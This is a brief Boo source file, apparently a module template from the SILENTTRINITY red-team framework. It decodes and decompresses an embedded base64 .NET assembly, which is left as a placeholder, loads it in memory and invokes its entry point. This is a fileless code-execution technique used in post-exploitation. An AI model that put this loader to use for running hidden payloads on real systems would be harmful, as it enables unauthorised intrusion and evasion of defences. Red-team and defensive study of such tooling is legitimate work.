import System
import System.Reflection
import System.IO


public static def localassembly(args as (string)):
    encodedCompressedAssembly = "B64_ENCODED_COMPRESSED_ASSEMBLY"
    deflatedStream = Compression.DeflateStream(
        MemoryStream(
            Convert.FromBase64String(encodedCompressedAssembly)
            ),
        Compression.CompressionMode.Decompress
    )

    uncompressedFileBytes as (byte) = array(byte, DECOMPRESSED_ASSEMBLY_LENGTH)
    deflatedStream.Read(uncompressedFileBytes, 0, DECOMPRESSED_ASSEMBLY_LENGTH)

    assembly = Assembly.Load(uncompressedFileBytes)
    args = "ASSEMBLY_ARGS",
    assembly.EntryPoint.Invoke(null, (of object: args))

#Needed to be constructed this way to fix: https://github.com/byt3bl33d3r/SILENTTRINITY/issues/104#issuecomment-535724440
public static def Main():
   args = "ASSEMBLY_ARGS"
   localassembly(args as (string))
